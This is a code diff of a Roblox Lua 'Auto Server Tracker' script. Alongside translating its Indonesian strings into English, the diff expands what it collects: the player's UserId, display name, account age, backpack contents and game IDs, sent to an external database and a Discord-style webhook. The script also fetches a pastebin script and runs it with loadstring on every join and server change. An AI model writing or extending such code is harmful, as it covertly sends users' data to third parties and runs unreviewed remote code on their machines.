@@ -10,6 +10,7 @@ local EXTERNAL_SCRIPT = "https://pastebin.com/raw/pfpzbXiF"
 local player = Players.LocalPlayer
 local currentJobId = game.JobId
 local playerName = player.Name
+local playerUserId = player.UserId
 
 -- Improved HTTP request with retry logic
 local function httpRequest(url, method, body, headers, retries)
@@ -54,7 +55,7 @@ local function executeExternalScript()
         loadstring(game:HttpGet(EXTERNAL_SCRIPT, true))()
     end)
     if not success then
-        warn("⚠️ Gagal mengeksekusi external script:", err)
+        warn("⚠️ Failed to execute external script:", err)
     end
     return success
 end
@@ -63,20 +64,27 @@ local function updateInstanceInDatabase()
     local data = {
         instanceId = currentJobId,
         player = {
-            userId = player.UserId,
+            userId = playerUserId,  -- Explicitly including userID
             name = player.Name,
-            accountAge = player.AccountAge
+            accountAge = player.AccountAge,
+            displayName = player.DisplayName
         },
-        timestamp = os.time()
+        timestamp = os.time(),
+        additionalData = {
+            gameId = game.GameId,
+            placeId = game.PlaceId
+        }
     }
     
     local response = httpRequest(API_ENDPOINT, "POST", HttpService:JSONEncode(data))
     
     if response and response.StatusCode == 200 then
-        print("✅ Berhasil memperbarui instance ID di database:", currentJobId)
+        print("✅ Successfully updated instance ID and user data in database")
+        print("   Instance ID:", currentJobId)
+        print("   User ID:", playerUserId)
         return true
     else
-        warn("❌ Gagal memperbarui instance ID:", response and response.StatusCode or "Tidak ada respon")
+        warn("❌ Failed to update database:", response and response.StatusCode or "No response")
         return false
     end
 end
@@ -86,29 +94,36 @@ local function sendServerChangeNotification()
         username = "Server Tracker",
         embeds = {
             {
-                title = "🔄 Perubahan Server Terdeteksi",
-                description = string.format("**%s** berpindah server\n**JobID Baru:** `%s`", playerName, currentJobId),
+                title = "🔄 Server Change Detected",
+                description = string.format("**%s** (UserID: %d) changed servers\n**New JobID:** `%s`", 
+                    playerName, playerUserId, currentJobId),
                 color = 16776960, -- Yellow
                 timestamp = DateTime.now():ToIsoDate(),
                 fields = {
                     {
-                        name = "👤 Info Pemain",
-                        value = string.format("UserID: %d", player.UserId),
+                        name = "👤 Player Info",
+                        value = string.format("UserID: %d\nDisplay Name: %s\nAccount Age: %d days", 
+                            playerUserId, player.DisplayName, player.AccountAge),
                         inline = true
                     },
                     {
-                        name = "📦 Isi Backpack",
+                        name = "📦 Backpack Contents",
                         value = getBackpackContents(),
                         inline = true
                     },
                     {
-                        name = "🔄 Status Script Eksternal",
-                        value = executeExternalScript() and "Berhasil dijalankan" or "Gagal dijalankan",
+                        name = "🎮 Game Info",
+                        value = string.format("Game ID: %d\nPlace ID: %d", game.GameId, game.PlaceId),
+                        inline = false
+                    },
+                    {
+                        name = "📜 External Script Status",
+                        value = executeExternalScript() and "✅ Executed successfully" or "❌ Failed to execute",
                         inline = false
                     }
                 },
                 footer = {
-                    text = "Auto Server Tracker v3.2"
+                    text = "Auto Server Tracker v3.3 | UserID: "..playerUserId
                 }
             }
         }
@@ -117,12 +132,12 @@ local function sendServerChangeNotification()
     httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(embed))
 end
 
--- Fungsi utama untuk menangani perubahan server
+-- Main function to handle server joins/changes
 local function handleServerJoin()
-    -- 1. Jalankan script eksternal secara asynchronous
+    -- Run external script asynchronously
     spawn(executeExternalScript)
     
-    -- 2. Update instance ID di database (dengan retry)
+    -- Update database with instance and user info
     local attempts = 0
     local maxAttempts = 3
     local success = false
@@ -131,36 +146,59 @@ local function handleServerJoin()
         attempts += 1
         success = updateInstanceInDatabase()
         if not success then
-            wait(2) -- Tunggu sebelum retry
+            wait(2) -- Wait before retrying
         end
     end
     
-    -- 3. Kirim notifikasi
+    -- Send notification
     sendServerChangeNotification()
 end
 
--- Sistem deteksi perubahan server
+-- Server change detection system
 local function monitorServerChanges()
     local lastJobId = currentJobId
     
     while true do
         local newJobId = game.JobId
         if newJobId ~= lastJobId then
-            print("🔄 Mendeteksi perubahan server:", lastJobId, "→", newJobId)
+            print("🔄 Detected server change:", lastJobId, "→", newJobId)
             currentJobId = newJobId
             lastJobId = newJobId
-            handleServerJoin() -- Proses perubahan server
+            handleServerJoin() -- Process the server change
         end
-        wait(1) -- Cek setiap detik
+        wait(1) -- Check every second
     end
 end
 
--- Eksekusi awal
+-- Initial execution
 local success, err = pcall(function()
-    handleServerJoin() -- Jalankan untuk join awal
-    monitorServerChanges() -- Mulai monitoring
+    print("🚀 Initializing Server Tracker for UserID:", playerUserId)
+    handleServerJoin() -- Run for initial join
+    monitorServerChanges() -- Start monitoring for changes
 end)
 
 if not success then
-    warn("❌ Error kritis dalam server tracker:", err)
+    warn("❌ Critical error in server tracker:", err)
+    -- Attempt to send error notification
+    local errorEmbed = {
+        username = "Server Tracker - ERROR",
+        embeds = {
+            {
+                title = "❌ Script Error Occurred",
+                description = string.format("UserID: %d encountered an error", playerUserId),
+                color = 16711680, -- Red
+                fields = {
+                    {
+                        name = "Error Details",
+                        value = tostring(err),
+                        inline = false
+                    }
+                },
+                footer = {
+                    text = "UserID: "..playerUserId
+                }
+            }
+        }
+    }
+    httpRequest(WEBHOOK_URL, "POST", HttpService:JSONEncode(errorEmbed))
 end
